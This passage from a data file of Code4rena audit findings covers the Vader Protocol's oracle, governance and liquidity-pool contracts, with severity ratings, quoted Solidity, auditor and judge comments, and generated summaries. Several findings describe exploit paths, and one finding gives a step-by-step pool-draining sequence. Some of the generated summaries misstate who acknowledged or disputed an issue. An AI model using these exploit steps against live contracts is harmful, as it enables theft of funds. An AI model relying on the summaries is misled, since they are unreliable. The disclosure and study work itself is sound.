      "content": "_Submitted by cmichel_\n\nThe `TWAPOracle.consult` function is unclear to the auditor.\nIt seems to iterate through all registered pairs that share the `token` parameter (USDV or VADER) and then sums up the foreign token pair per `token` price.\nAnd divides this sum (`sumNative`) by the summed-up USD price of these foreign token pairs (`sumUSD`).\n\nI think the idea is to create some kind of average price but doing it like this does not seem to be effective because large prices are weighted a lot stronger than low prices.\n\n###### Example\n\nAssume there are 3 USDV pairs registered: `(ETH, DAI, USDC)`.\n\nOracle Price: USDV/ETH 4500, USDV/DAI 1, USDV/USDC 1\nPool price: USDV/ETH 4500, USDV/DAI 10, USDV/USDC 10\n\nEven though the DAI and USDC pool prices are off by 10x, the final result is `4502/4520 = 0.996017699` very close to a price of `1.0` which seems strange.\n\n#### Recommended Mitigation Steps\n\nDocument how the algorithm works and make sure it's correct.\nResolve the `TODO`.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/173)**\n>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n",
      "summary": "\nA user named cmichel has submitted a bug report regarding the `TWAPOracle.consult` function. The function seems to be unclear to the auditor as it iterates through all registered pairs that share the `token` parameter (USDV or VADER) and then sums up the foreign token pair per `token` price. This sum is then divided by the summed-up USD price of these foreign token pairs. The purpose of this function is to create an average price, but it is not effective because large prices are weighted more heavily than low prices. \n\nThe bug report includes an example to illustrate the issue. In this example, there are three USDV pairs registered: ETH, DAI, and USDC. The oracle price for these pairs is USDV/ETH 4500, USDV/DAI 1, and USDV/USDC 1. However, the pool price for these pairs is USDV/ETH 4500, USDV/DAI 10, and USDV/USDC 10. This means that the DAI and USDC pool prices are off by 10x, but the final result is very close to a price of 1.0, which seems strange. \n\nThe recommended mitigation steps for this bug include documenting how the algorithm works and ensuring that it is correct. The `TODO` should also be resolved. SamSteinGG (Vader) has confirmed the bug and it has been completely removed and redesigned from scratch as LBTwap, which will be subject to a new audit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/173",
      "tags": [],
      "finders": []
    },
    {
      "id": "42353",
      "title": "[M-18] `TWAPOracle.getRate` does not scale the ratio",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nThe `TWAPOracle.getRate` function simply performs an integer division to compute the rate.\n\n```solidity\nfunction getRate() public view returns (uint256 result) {\n    uint256 tUSDInUSDV = consult(USDV);\n    uint256 tUSDInVader = consult(VADER);\n    // @audit shouldn't this scale by 1e18 first? otherwise easily 0\n    result = tUSDInUSDV / tUSDInVader;\n}\n```\n\nIt should first be scaled by some value, for example, `1e18`.\n\n#### Impact\n\nThe rate has no decimal precision and if `tUSDInVader > tUSDInUSDV`, the rate will always be zero.\n\nThe `usdvtoVader` and `vaderToUsdv` functions will return incorrect values.\n\n#### Recommended Mitigation Steps\n\n```solidity\n// return as a rate with 18 decimals instead\nresult = tUSDInUSDV * 1e18 / tUSDInVader;\n```\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/172)**\n>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n",
      "summary": "\n\nThe bug report by cmichel highlights an issue with the `TWAPOracle.getRate` function in the Solidity code. This function is used to compute a rate by performing an integer division, which can result in incorrect values. The impact of this bug is that the rate has no decimal precision and can be zero if certain conditions are met. This can also affect other functions such as `usdvtoVader` and `vaderToUsdv`. To fix this bug, it is recommended to scale the rate by a value, such as `1e18`, before performing the division. The team behind the code has confirmed the issue and has since removed and redesigned the TWAP oracle module.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/172",
      "tags": [],
      "finders": []
    },
    {
      "id": "42352",
      "title": "[M-16] Governor's veto protection can be exploited",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nThe `GovernorAlpha`'s council cannot veto proposals that perform a call to the contract itself.\nThis can be exploited by malicious proposal creators by appending a new call at the end of their proposal that simply calls an innocent function like `GovernorAlpha.votingDelay()`.\n\n#### Impact\n\nThe veto procedure can easily be circumvented, making the council unable to veto.\n\n#### Recommended Mitigation Steps\n\nThe veto check must be further restricted by specifying the actual function selector that is not allowed to be vetoed, like `changeCouncil`.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/167#issuecomment-974605849):**\n > Duplicate of #61\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/167#issuecomment-991457316):**\n > Not a duplicate\n\n\n\n",
      "summary": "\nA user named cmichel has reported a bug in the `GovernorAlpha` contract. The bug allows malicious users to exploit the contract by adding a call to the contract itself in their proposal. This makes it impossible for the council to veto the proposal. The impact of this bug is that the council's power is circumvented. To fix this, the veto check needs to be more specific and only allow certain functions to be vetoed. Another user named SamSteinGG has pointed out that this bug has already been reported in issue #61. However, a judge named alcueca has commented that this is not a duplicate issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/167",
      "tags": [],
      "finders": []
    },
    {
      "id": "42351",
      "title": "[M-15] Lacking Validation Of Chainlink' Oracle Queries",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\n#### Impact\n\n`TwapOracle.consult()` is missing additional validations to ensure that the round is complete and has returned a valid/expected price. The `consult()` improperly casts an `int256 price` to `uint256` without first checking the value. As a result, the variable may underflow and return an unexpected result, potentially causing further issues in other areas of the protocol that rely on this function.\n\nAdditionally, the `GasThrottle.validateGas()` modifier utilises Chainlink's `latestAnswer()` function which lacks additional checks for stale data. The `latestRoundData()` function facilitates additional checks and should be used over `latestAnswer()`.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L134-L150>\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/utils/GasThrottle.sol#L15>\n- <https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round>\n\n#### Tools Used\n\nManual code review.\nChainlink best practices.\n\n#### Recommended Mitigation Steps\n\nConsider validating the output of `latestRoundData()` to match the following code snippet:\n\n         (\n            uint80 roundID,\n            int256 price,\n            ,\n            uint256 updateTime,\n            uint80 answeredInRound\n          ) = ETH_CHAINLINK.latestRoundData();\n          require(\n              answeredInRound >= roundID,\n              \"Chainlink Price Stale\"\n          );\n          require(price > 0, \"Chainlink Malfunction\");\n          require(updateTime != 0, \"Incomplete round\");\n\nThis needs to be updated in `TwapOracle.consult()` and in `GasThrottle.validateGas()`. The latter instance should have the `latestAnswer()` function replaced with `latestRoundData()` in order to avoid stale data.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/151)** \n>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n",
      "summary": "\nThe bug report states that the `TwapOracle.consult()` function is missing important checks to ensure that the round is complete and the price returned is valid. This can lead to unexpected results and cause problems in other parts of the protocol. Additionally, the `GasThrottle.validateGas()` function uses a method that does not have enough checks for outdated data. The report recommends using a different method to avoid this issue. The bug was found through a manual code review and the use of Chainlink best practices. To fix the issue, the report suggests adding validations to the `TwapOracle.consult()` and `GasThrottle.validateGas()` functions and using a different method, `latestRoundData()`, instead of the current method, `latestAnswer()`. The team behind the protocol has confirmed the bug and has already removed the problematic code and redesigned the oracle module.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/151",
      "tags": [],
      "finders": []
    },
    {
      "id": "42350",
      "title": "[M-14] `BasePool.swap()` Is Callable By Anyone",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\n#### Impact\n\nThe `BasePool.swap()` function differs from its implementation in `BasePoolV2.swap()` in which it lacks an `onlyRouter` modifier. This ensures that users cannot call this function directly as `VaderRouter._swap()` performs some necessary input validation which can be bypassed by directly calling `BasePool.swap()`.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/router/VaderRouter.sol#L304-L351>\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L289-L379>\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L261-L268>\n\n#### Tools Used\n\nManual code review.\n\n#### Recommended Mitigation Steps\n\nConsider adding an `onlyRouter` modifier to the `BasePool.swap()` functions to ensure users cannot directly call these functions.\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/149#issuecomment-979165745):**\n > The pool contracts, similarly to Uniswap V2, are never meant to be interacted with directly.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/149#issuecomment-991477556):**\n > That's what the modifier would do.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/149#issuecomment-995728209):**\n > @alcueca They are never meant however it should still be possible to do so. With Uniswap V2, it is possible to interact with the contracts directly however doing so (without using a smart contract) will result in the same vulnerabilities as described in the issue. This is not intended usage and as such does not constitute an issue unless it is implied that the Uniswap V2 implementation is incorrect.\n>\n\n\n\n",
      "summary": "\nThe report discusses a bug found in the `BasePool.swap()` function of the Vader protocol. This function does not have an `onlyRouter` modifier, which means that users can call it directly instead of going through the necessary input validation in `VaderRouter._swap()`. This can lead to potential vulnerabilities. The report recommends adding an `onlyRouter` modifier to the `BasePool.swap()` function to prevent direct calls. The team behind Vader has disputed this issue, stating that the pool contracts are not meant to be interacted with directly. However, the report suggests that this modifier would still be beneficial as it is possible to interact with the contracts directly in Uniswap V2 and can result in similar vulnerabilities. The team has not yet confirmed whether they will address this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/149",
      "tags": [],
      "finders": []
    },
    {
      "id": "42349",
      "title": "[M-13] `BasePool.mint()` Is Callable By Anyone",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\n#### Impact\n\nThe `BasePool.mint()` function differs from its implementation in `BasePoolV2.mint()` in which it lacks an `onlyRouter` modifier. This ensures that users cannot call this function directly as `VaderRouter.addLiquidity()` performs some necessary input validation which can be bypassed by directly calling `BasePool.mint()`.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/router/VaderRouter.sol#L123-L150>\n- <https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L149-L194>\n\n#### Tools Used\n\nManual code review.\n\n#### Recommended Mitigation Steps\n\nConsider adding an `onlyRouter` modifier to the `BasePool.mint()` function to ensure users cannot directly call this function.\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/148#issuecomment-979165529):**\n > The pool contracts, similarly to Uniswap V2, are never meant to be interacted with directly.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/148#issuecomment-991477706):**\n > That's what the modifier would do.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/148#issuecomment-995728978):**\n > They are never meant however it should still be possible to do so. With Uniswap V2, it is possible to interact with the contracts directly however doing so (without using a smart contract) will result in the same vulnerabilities as described in the issue. This is not intended usage and as such does not constitute an issue unless it is implied that the Uniswap V2 implementation is incorrect.\n>\n\n\n\n",
      "summary": "\nThe bug report discusses an issue with the `BasePool.mint()` function in the Vader protocol. This function does not have a necessary `onlyRouter` modifier, which allows users to bypass input validation by directly calling the function instead of using the `VaderRouter.addLiquidity()` function. This could potentially lead to vulnerabilities. The bug was identified through manual code review and the recommended solution is to add the `onlyRouter` modifier to prevent direct calls to the function. The Vader team argues that the pool contracts are not meant to be interacted with directly, similar to Uniswap V2, and therefore this issue does not pose a significant threat. However, the judge and the reporter suggest implementing the modifier as a precaution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/148",
      "tags": [],
      "finders": []
    },
    {
      "id": "42348",
      "title": "[M-11] TWAP Oracle inflexible `_updatePeriod`",
      "impact": "MEDIUM",
      "content": "_Submitted by elprofesor_\n\n#### Impact\n\nUpdate periods in TWAP oracles reflect risk of an asset.  Updating more frequently accurately prices an asset but increases capabilities of manipulation (which should be harder with more stable assets), whereas longer update periods prevent manipulation but does not accurately price assets (due to the time difference between updates). Volatility of an asset should be considered when calculating update periods. However, in Vader's `TwapOracle.sol` no such considerations are made, the `_updatePeriod` cannot be changed after deployment of the contract. Additionally, each asset uses the same `_updatePeriod`  which does not adequately account for the differences in risk for each asset. This could lead to price manipulation or inadequate pricing of assets.\n\n#### Proof of Concept\n\n[the only chance to set `_updatePeriod`](https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/twap/TwapOracle.sol#L80)\n\n[`_updatePeriod` used in time elapsed calculation](https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/twap/TwapOracle.sol#L345)\n\n#### Recommended Mitigation Steps\n\nAdd the following function\n\n    function setUpdatePeriod(uint256 newUpdatePeriod) external onlyOwner {\n        require(newUpdatePeriod > minimumUpdatePeriod, \"Update period must be larger than threshold\"); // Optional validation based on some risk tolerance\n        _updatePeriod = newUpdatePeriod;\n    }\n\n**[CloudEllie (organizer) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/136#issuecomment-970374263):**\n > Warden has requested that we add a second mitigation step/strategy to his submission:\n>\n> > 2. Consider adding a configurable update period per asset, this way we are not incorrectly assuming the same risk profile per asset.\n\n**[SamSteinGG (Vader) diagreed with severity](https://github.com/code-423n4/2021-11-vader-findings/issues/136#issuecomment-979161186):**\n >  This finding is accurate as the update period should change per oracle, however, it is not of high risk severity.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/136#issuecomment-991836707):**\n > Agree with sponsor, assets are not directly at risk. Severity 2.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/136#issuecomment-999352737):**\n >  The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n\n",
      "summary": "\nThe report is about a bug in the TWAP oracles used in Vader's `TwapOracle.sol` contract. These oracles are responsible for updating the price of assets, but they do not take into account the volatility of each asset. This means that the update periods are the same for all assets, which could lead to price manipulation or inaccurate pricing. The report recommends adding a function to change the update period and considering a different update period for each asset. The severity of the bug is debated, with the sponsor and judge considering it a low risk, but the developer disagrees and has already redesigned the TWAP oracle module.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/136",
      "tags": [],
      "finders": []
    },
    {
      "id": "42347",
      "title": "[M-03] Permissioned nature of `TwapOracle` allows owner to manipulate oracle",
      "impact": "MEDIUM",
      "content": "_Submitted by TomFrenchBlockchain_\n\n#### Impact\n\nPotentially frozen or purposefully inaccurate USDV:VADER price feed.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-vader/blob/3a43059e33d549f03b021d6b417b7eeba66cf62e/contracts/twap/TwapOracle.sol#L322>\n\nOnly the owner of `TwapOracle` can call `update` on the oracle. Should the owner desire they could cease calling `update` on the oracle for a period. Over this period the relative prices of VADER and USDC will vary.\n\nAfter some period `timeElapsed` the owner can call `update` again. A TWAP is a lagging indicator and due to the owner ceasing to update the oracle so `timeElapsed` will be very large, therefore we're averaging over a long period into the past resulting in a value which may not be representative of the current USDV:VADER exchange rate.\n\nThe owner can therefore selectively update the oracle so to result in prices which allow them to extract value from the system.\n\n#### Recommended Mitigation Steps\n\nRemove the permissioning from `TwapOracle.update`\n\n**[SamSteinGG (Vader) marked as duplicate](https://github.com/code-423n4/2021-11-vader-findings/issues/20)** \n\n**[alcueca commented](https://github.com/code-423n4/2021-11-vader-findings/issues/20#issuecomment-991011036):**\n > Duplicate of which other issue, @SamSteinGG?\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/20#issuecomment-999353780):**\n > The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n",
      "summary": "\nThis bug report was submitted by a user named TomFrenchBlockchain. The issue reported is that the USDV:VADER price feed may be frozen or intentionally inaccurate. This can happen because only the owner of the \"TwapOracle\" contract can update the price feed. If the owner chooses to stop updating the feed for a period of time, the relative prices of VADER and USDC will change. When the owner eventually updates the feed again, the resulting price may not accurately reflect the current exchange rate. This means that the owner can manipulate the price to their advantage. \n\nThe recommended solution is to remove the permissioning from the \"TwapOracle\" contract, which would allow anyone to update the price feed. This issue has been marked as a duplicate by SamSteinGG and it has been mentioned that the TWAP oracle module has been completely redesigned and is now subject to a new audit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/20",
      "tags": [],
      "finders": []
    },
    {
      "id": "42346",
      "title": "[H-34] Incorrect Accrual Of `sumNative` and `sumUSD` In Producing Consultation Results",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\n#### Impact\n\nThe `TwapOracle.consult()` function iterates over all token pairs which belong to either `VADER` or USDV\\` and then calculates the price of the respective asset by using both UniswapV2 and Chainlink price data. This helps to further protect against price manipulation attacks as the price is averaged out over the various registered token pairs.\n\nLet's say we wanted to query the price of `USDV`, we would sum up any token pair where `USDV == pairData.token0`.\n\nThe sum consists of the following:\n\n*   Price of `USDV` denominated in terms of `token1` (`USDV/token1`).\n*   Price of token1 denominated in terms of `USD` (`token1/USD`).\n\nConsider the following example:\n\n*   `SUSHI` and `UNISWAP` are the only registered token pairs that exist alongside `USDV`.\n*   Hence, calculating `sumNative` gives us an exchange rate that is denominated as the sum of `USDV/SUSHI` and `USDV/UNISWAP`.\n*   Similarly, `sumUSD` gives us the following denominated pairs, `SUSHI/USD` and `UNISWAP/USD`.\n*   Summing `sumUSD` and `sumNative` produces an entirely incorrect result as compared to multiplying the two results first and then summing.\n*   The issue is equivalent to the same issue as performing `(p1 + p2)*(q1 + q2)` as compared to `(p1*q1 + p2*q2)`. Obviously, these two results are not equivalent, however, the `consult()` function treats them as such.\n*   If we multiply the native price and Chainlink oracle results, then we can correctly calculate the price as such; `(SUSHI/USD * USDV/SUSHI + UNISWAP/USD * USDV/UNISWAP) / 2`, which should correctly give us the correct denomination and average price.\n\nHowever, the protocol calculates it as `((SUSHI/USD + UNISWAP/USD) * token.decimals()) / (USDV/SUSHI + USDV/UNISWAP)` which gives us an incorrectly denominated result.\n\nI'd classify this issue as high risk as the oracle returns false results upon being consulted. This can lead to issues in other areas of the protocol that use this data in performing sensitive actions.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L115-L157>\n\nSimilar working implementation listed below:\n\n*   <https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L184-L211>\n*   <https://github.com/gg2001/dpx-oracle/blob/master/contracts/UniswapV2Oracle.sol#L291-L304>\n\n#### Tools Used\n\nManual code review.\n\n#### Recommended Mitigation Steps\n\nTo calculate the correct consultation of a given token, the returned result should consist of a sum of `priceUSD * token.decimals() * priceNative` divided by the number of calculations. This should correctly take the average token pair price.\n\nThe following snippet of code details the relevant fix:\n\n        function consult(address token) public view returns (uint256 result) {\n            uint256 pairCount = _pairs.length;\n\n            for (uint256 i = 0; i < pairCount; i++) {\n                PairData memory pairData = _pairs[i];\n\n                if (token == pairData.token0) {\n                    //\n                    // TODO - Review:\n                    //   Verify price1Average is amount of USDV against 1 unit of token1\n                    //\n\n                    priceNative = pairData.price1Average.mul(1).decode144(); // native asset amount\n                    if (pairData.price1Average._x != 0) {\n                        require(priceNative != 0);\n                    } else {\n                        continue; // should skip newly registered assets that have not been updated yet.\n                    }\n\n                    (\n                        uint80 roundID,\n                        int256 price,\n                        ,\n                        ,\n                        uint80 answeredInRound\n                    ) = AggregatorV3Interface(_aggregators[pairData.token1])\n                            .latestRoundData();\n\n                    require(\n                        answeredInRound >= roundID,\n                        \"TwapOracle::consult: stale chainlink price\"\n                    );\n                    require(\n                        price != 0,\n                        \"TwapOracle::consult: chainlink malfunction\"\n                    );\n                    priceUSD = uint256(price) * (10**10);\n                    result += ((priceUSD * IERC20Metadata(token).decimals()) * priceNative);\n                }\n            }\n            require(sumNative != 0, \"TwapOracle::consult: Sum of native is zero\");\n            return result;\n        }\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/260)** \n>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n\n",
      "summary": "\nThe `TwapOracle.consult()` function in the Vader protocol calculates the price of assets by using data from both UniswapV2 and Chainlink. However, there is an error in the calculation that can lead to incorrect results. This is a high-risk issue as it can impact other parts of the protocol that rely on this data. A recommended fix is to adjust the code to correctly calculate the average token pair price. The Vader team has confirmed the issue and has redesigned the module. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/260",
      "tags": [],
      "finders": []
    },
    {
      "id": "42345",
      "title": "[H-25] Wrong design of `swap()` results in unexpected and unfavorable outputs",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nThe current formula to calculate the `amountOut` for a swap is:\n\n<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex/math/VaderMath.sol#L99-L111>\n\n```solidity\nfunction calculateSwap(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n) public pure returns (uint256 amountOut) {\n    // x * Y * X\n    uint256 numerator = amountIn * reserveIn * reserveOut;\n\n    // (x + X) ^ 2\n    uint256 denominator = pow(amountIn + reserveIn);\n\n    amountOut = numerator / denominator;\n}\n```\n\nWe believe the design (the formula) is wrong and it will result in unexpected and unfavorable outputs.\n\nSpecifically, if the `amountIn` is larger than the `reserveIn`, the `amountOut` starts to decrease.\n\n##### Proof of Concept\n\nGiven:\n\n*   A USDV-BTC Vader pool with the reserves of `200,000 USDV` and `2 BTC`.\n\n1.  If Alice swap `2 BTC` for USDV, will get `50000 USDV` as output;\n2.  If Bob swap `2.1 BTC` for USDV, will only get `49970.25 USDV` as output;\n3.  If Carol swap `2.2 BTC` for USDV, will only get `49886.62 USDV` as output.\n\nFor the same pool reserves, paying more for less output token is unexpected and unfavorable.\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/213#issuecomment-979177813):**\n > This is the intended design of the Thorchain CLP model. Can the warden provide a tangible attack vector in the form of a test?\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/213#issuecomment-991472702):**\n > It is true that the effect will be surprising to the user, and the issue is acknowledged by the sponsor.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/213#issuecomment-995710944):**\n > @alcueca We do not acknowledge the issue. This is the intended design of the CLP model and the amount supplied for a trade is meant to be safeguarded off-chain. It is an inherent trait of the model.\n>\n\n\n\n",
      "summary": "\nThe current formula used to calculate the `amountOut` for a swap in Vader's USDV-BTC pool is believed to be incorrect. It produces unexpected and unfavorable outputs when the `amountIn` is larger than the `reserveIn`. For example, if someone swaps `2.1 BTC` for USDV, they will only receive `49970.25 USDV` instead of the expected `50000 USDV`. This issue has been disputed by Vader, who claims it is the intended design of their Thorchain CLP model. However, the sponsor has acknowledged the issue and it is recommended to provide a tangible attack vector in the form of a test.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/213",
      "tags": [],
      "finders": []
    },
    {
      "id": "42344",
      "title": "[H-24] Wrong design/implementation of `addLiquidity()` allows attacker to steal funds from the liquidity pool",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nThe current design/implementation of Vader pool allows users to `addLiquidity` using arbitrary amounts instead of a fixed ratio of amounts in comparison to Uni v2.\n\nWe believe this design is flawed and it essentially allows anyone to manipulate the price of the pool easily and create an arbitrage opportunity at the cost of all other liquidity providers.\n\nAn attacker can exploit this by adding liquidity in extreme amounts and drain the funds from the pool.\n\n<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/VaderPoolV2.sol#L284-L335>\n\n```solidity\nfunction mintFungible(\n    IERC20 foreignAsset,\n    uint256 nativeDeposit,\n    uint256 foreignDeposit,\n    address from,\n    address to\n) external override nonReentrant returns (uint256 liquidity) {\n    IERC20Extended lp = wrapper.tokens(foreignAsset);\n\n    require(\n        lp != IERC20Extended(_ZERO_ADDRESS),\n        \"VaderPoolV2::mintFungible: Unsupported Token\"\n    );\n\n    (uint112 reserveNative, uint112 reserveForeign, ) = getReserves(\n        foreignAsset\n    ); // gas savings\n\n    nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);\n    foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);\n\n    PairInfo storage pair = pairInfo[foreignAsset];\n    uint256 totalLiquidityUnits = pair.totalSupply;\n    if (totalLiquidityUnits == 0) liquidity = nativeDeposit;\n    else\n        liquidity = VaderMath.calculateLiquidityUnits(\n            nativeDeposit,\n            reserveNative,\n            foreignDeposit,\n            reserveForeign,\n            totalLiquidityUnits\n        );\n\n    require(\n        liquidity > 0,\n        \"VaderPoolV2::mintFungible: Insufficient Liquidity Provided\"\n    );\n\n    pair.totalSupply = totalLiquidityUnits + liquidity;\n\n    _update(\n        foreignAsset,\n        reserveNative + nativeDeposit,\n        reserveForeign + foreignDeposit,\n        reserveNative,\n        reserveForeign\n    );\n\n    lp.mint(to, liquidity);\n\n    emit Mint(from, to, nativeDeposit, foreignDeposit);\n}\n```\n\n##### Proof of Concept\n\nGiven:\n\n*   A Vader pool with `100,000 USDV` and `1 BTC`;\n*   The `totalPoolUnits` is `100`.\n\nThe attacker can do the following in one transaction:\n\n1.  Add liquidity with `100,000 USDV` and 0 BTC, get `50 liquidityUnits`, representing 1/3 shares of the pool;\n2.  Swap `0.1 BTC` to USDV, repeat for 5 times; spent`0.5 BTC` and got `62163.36 USDV`;\n3.  Remove liquidity, get back `45945.54 USDV` and `0.5 BTC`; profit for: 62163.36 + 45945.54 - 100000 = 8108.9 USDV.\n\n**[SamSteinGG (Vader) disputed](https://github.com/code-423n4/2021-11-vader-findings/issues/212#issuecomment-979177570):**\n > This is the intended design of the Thorchain CLP model. Can the warden provide a tangible attack vector in the form of a test?\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/212#issuecomment-991472853):**\n > Sponsor is acknowledging the issue.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/212#issuecomment-995712459):**\n > @alcueca We do not acknowledge the issue. This is the intended design of the CLP model and the amount supplied for a trade is meant to be safeguarded off-chain. It is an inherent trait of the model.\n>\n\n\n\n",
      "summary": "\nThe current design of Vader pool allows users to add liquidity using any amount, instead of a fixed ratio like Uni v2. This can be exploited by attackers to manipulate the pool's price and create an opportunity for arbitrage. The code snippet provided shows how this can be done. The proof of concept shows how an attacker can profit by adding liquidity, swapping BTC for USDV, and then removing the liquidity. The Vader team has disputed this issue, stating that it is the intended design of the Thorchain CLP model. The judge has acknowledged the issue, but the Vader team does not acknowledge it and claims it is inherent to the model.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/212",
      "tags": [],
      "finders": []
    },
    {
      "id": "42343",
      "title": "[H-23] `Synth` tokens can get over-minted",
      "impact": "HIGH",
